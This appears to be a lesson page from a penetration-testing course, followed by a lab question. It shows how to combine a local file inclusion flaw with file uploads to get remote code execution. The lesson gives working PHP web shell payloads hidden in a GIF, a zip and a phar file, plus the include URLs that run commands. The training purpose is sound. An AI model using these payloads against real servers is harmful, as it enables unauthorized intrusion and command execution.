
<h1>LFI and File Uploads</h1>
<p>File upload functionalities are ubiquitous in most modern web applications, as users usually need to configure their profile and usage of the web application by uploading their data. For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability.</p>
<p>The <a href="/module/details/136">File Upload Attacks</a> module covers different techniques on how to exploit file upload forms and functionalities. However, for the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files. If the vulnerable function has code <code>Execute</code> capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. <code>image.jpg</code>), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.</p>
<p>As mentioned in the first section, the following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:</p>
<table>
<thead>
<tr>
<th><strong>Function</strong></th>
<th align="center"><strong>Read Content</strong></th>
<th align="center"><strong>Execute</strong></th>
<th align="center"><strong>Remote URL</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>PHP</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td><code>include()</code>/<code>include_once()</code></td>
<td align="center">✅</td>
<td align="center">✅</td>
<td align="center">✅</td>
</tr>
<tr>
<td><code>require()</code>/<code>require_once()</code></td>
<td align="center">✅</td>
<td align="center">✅</td>
<td align="center">❌</td>
</tr>
<tr>
<td><strong>NodeJS</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td><code>res.render()</code></td>
<td align="center">✅</td>
<td align="center">✅</td>
<td align="center">❌</td>
</tr>
<tr>
<td><strong>Java</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td><code>import</code></td>
<td align="center">✅</td>
<td align="center">✅</td>
<td align="center">✅</td>
</tr>
<tr>
<td><strong>.NET</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td><code>include</code></td>
<td align="center">✅</td>
<td align="center">✅</td>
<td align="center">✅</td>
</tr>
</tbody>
</table>
<hr/>
<h2>Image upload</h2>
<p>Image upload is very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded. However, as discussed earlier, the vulnerability, in this case, is not in the file upload form but the file inclusion functionality.</p>
<h4>Crafting Malicious Image</h4>
<p>Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. <code>shell.gif</code>), and should also include the image magic bytes at the beginning of the file content (e.g. <code>GIF8</code>), just in case the upload form checks for both the extension and content type as well. We can do so as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif
</code></pre>
<p>This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> We are using a <code>GIF</code> image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The <a href="/module/details/136">File Upload Attacks</a> module goes more in depth for file type attacks, and the same logic can be applied here.</p>
</div>
</div>
<p>Now, we need to upload our malicious image file. To do so, we can go to the <code>Profile Settings</code> page and click on the avatar image to select our image, and then click on upload and our image should get successfully uploaded:
<img alt="Profile image upload interface with a successful upload message." class="website-screenshot" data-url="http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/settings.php" src="/storage/modules/23/lfi_upload_gif.jpg"/></p>
<h4>Uploaded File Path</h4>
<p>Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:</p>
<pre><code class="language-html">&lt;img src="/profile_images/shell.gif" class="profile-image" id="profile-image"&gt;
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> As we can see, we can use `/profile_images/shell.gif` for the file path. If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.</p>
</div>
</div>
<p>With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed, as follows:
<img alt="Shipping containers and cranes at a port with user data information displayed." class="website-screenshot" data-url="http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id" src="/storage/modules/23/lfi_include_uploaded_gif.jpg"/></p>
<p>As we can see, we included our file and successfully executed the <code>id</code> command.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> To include to our uploaded file, we used <code>./profile_images/</code> as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to <code>../</code> out of that directory and then use our URL path, as we learned in previous sections.</p>
</div>
</div>
<hr/>
<h2>Zip Upload</h2>
<p>As mentioned earlier, the above technique is very reliable and should work in most cases and with most web frameworks, as long as the vulnerable function allows code execution. There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.</p>
<p>We can utilize the <a href="https://www.php.net/manual/en/wrappers.compression.php">zip</a> wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named <code>shell.jpg</code>), as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.</p>
</div>
</div>
<p>Once we upload the <code>shell.jpg</code> archive, we can include it with the <code>zip</code> wrapper as (<code>zip://shell.jpg</code>), and then refer to any files within it with <code>#shell.php</code> (URL encoded). Finally, we can execute commands as we always do with <code>&amp;cmd=id</code>, as follows:
<img alt="Shipping containers and cranes at a port with user data and a PHP notice about an undefined variable." class="website-screenshot" data-url="http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id" src="/storage/modules/23/data_wrapper_id.png"/></p>
<p>As we can see, this method also works in executing commands through zipped PHP scripts.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> We added the uploads directory (<code>./profile_images/</code>) before the file name, as the vulnerable page (<code>index.php</code>) is in the main directory.</p>
</div>
</div>
<hr/>
<h2>Phar Upload</h2>
<p>Finally, we can use the <code>phar://</code> wrapper to achieve a similar result. To do so, we will first write the following PHP script into a <code>shell.php</code> file:</p>
<pre><code class="language-php">&lt;?php
$phar = new Phar('shell.phar');
$phar-&gt;startBuffering();
$phar-&gt;addFromString('shell.txt', '&lt;?php system($_GET["cmd"]); ?&gt;');
$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');

$phar-&gt;stopBuffering();
</code></pre>
<p>This script can be compiled into a <code>phar</code> file that when called would write a web shell to a <code>shell.txt</code> sub-file, which we can interact with. We can compile it into a <code>phar</code> file and rename it to <code>shell.jpg</code> as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg
</code></pre>
<p>Now, we should have a phar file called <code>shell.jpg</code>. Once we upload it to the web application, we can simply call it with <code>phar://</code> and provide its URL path, and then specify the phar sub-file with <code>/shell.txt</code> (URL encoded) to get the output of the command we specify with (<code>&amp;cmd=id</code>), as follows:
<img alt="Shipping containers and cranes at a port with user data information displayed." class="website-screenshot" data-url="http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id" src="/storage/modules/23/rfi_localhost.jpg"/></p>
<p>As we can see, the <code>id</code> command was successfully executed. Both the <code>zip</code> and <code>phar</code> wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the <code>phpinfo()</code> page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo">This Link</a>.</p>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="1072"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Use any of the techniques covered in this section to gain RCE and read the flag at /
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer1072" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-1072">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="1072" id="btnAnswer1072">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint1072" data-toggle="modal" id="hintBtn1072"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
